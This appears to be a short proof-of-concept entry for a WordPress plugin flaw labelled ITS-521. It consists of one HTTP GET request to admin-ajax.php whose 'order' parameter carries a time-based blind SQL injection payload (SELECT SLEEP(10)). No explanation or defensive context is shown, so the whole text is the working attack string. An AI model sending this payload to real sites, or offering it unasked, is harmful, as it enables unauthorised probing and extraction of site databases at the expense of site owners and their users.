# Vulnerable: ITS-521
GET /wp-admin/admin-ajax.php?action=ajax_fetch_report_list&order=,(SELECT+1+FROM+(SELECT(SLEEP(10)))a)--+-
